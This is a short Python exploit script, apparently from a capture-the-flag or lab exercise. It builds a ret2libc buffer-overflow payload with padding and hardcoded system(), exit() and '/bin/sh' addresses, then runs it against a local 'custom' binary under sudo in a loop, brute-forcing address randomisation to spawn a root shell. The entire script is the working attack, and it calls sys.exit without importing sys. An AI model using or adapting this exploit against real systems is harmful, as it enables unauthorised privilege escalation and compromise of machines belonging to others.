#!/usr/bin/python3


import subprocess
from struct import pack

offset = 112
before_eip = b"A" * offset

# ret2libc -> system("/bin/sh")
#00033990 -> exit@@GLIBC_2.0 
#00041040 -> system@@GLIBC_2.0
# 187338 -> /bin/sh


base_libc_addr = 0xf7d56000

system_addr_off = 0x00041040
exit_addr_off = 0x00033990
bin_sh_off = 0x187338

system_addr = pack("<L", base_libc_addr + system_addr_off) 
exit_addr = pack("<L", base_libc_addr + exit_addr_off)
bin_sh = pack("<L", base_libc_addr + bin_sh_off)

payload = before_eip + system_addr + exit_addr + bin_sh

while True:
    result = subprocess.run(["sudo", "./custom", payload])
    if result.returncode == 0:
        print("Exploit success!")
        sys.exit(0)
        

